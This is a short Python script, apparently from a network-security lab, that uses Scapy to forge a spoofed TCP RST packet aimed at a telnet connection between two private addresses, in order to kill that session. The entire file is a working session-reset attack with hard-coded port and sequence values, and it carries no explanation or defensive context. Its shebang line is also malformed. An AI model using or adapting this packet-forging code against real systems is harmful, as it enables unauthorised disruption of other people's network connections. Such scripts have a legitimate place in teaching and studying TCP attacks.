#!use/bin/python3
from scapy.all import *
import sys

s_port = 42970
sequence = 326232340

print("Sending RST Packet..")
ip = IP(src='10.0.2.9',dst='10.0.2.8')
tcp = TCP(sport=s_port,dport=23,flags="R",seq=sequence)
pkt=ip/tcp
pkt.show()
send(pkt,verbose=0)